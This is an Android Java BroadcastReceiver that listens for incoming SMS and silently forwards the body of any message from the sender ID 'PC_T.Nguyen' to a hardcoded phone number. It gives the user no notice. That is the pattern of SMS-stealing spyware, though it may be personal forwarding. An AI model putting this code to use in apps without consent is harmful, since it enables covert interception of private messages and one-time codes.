package com.example.huy.listensms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSReciver extends BroadcastReceiver {
    private static final String TAG = "SmsBroadcastReceiver";

    private static final String smsToNumber = "+841668283196";
    private static final String serviceProviderNumber = "PC_T.Nguyen";


    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            String smsSender = "";
            StringBuilder smsBody = new StringBuilder();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                    smsSender = smsMessage.getDisplayOriginatingAddress().trim();
                    smsBody.append(smsMessage.getMessageBody());
                }
            } else {
                Bundle smsBundle = intent.getExtras();
                if (smsBundle != null) {
                    Object[] pdus = (Object[]) smsBundle.get("pdus");
                    if (pdus == null) {
                        // Display some error to the user
                        Log.e(TAG, "SmsBundle had no pdus key");
                        return;
                    }
                    SmsMessage[] messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < messages.length; i++) {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        smsBody.append(messages[i].getMessageBody());
                    }
                    smsSender = messages[0].getOriginatingAddress().trim();
                }
            }

            if (smsSender.equals(serviceProviderNumber)) {
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(smsToNumber, null, smsSender + " : " + smsBody.toString(), null, null);
            }
        }
    }
}
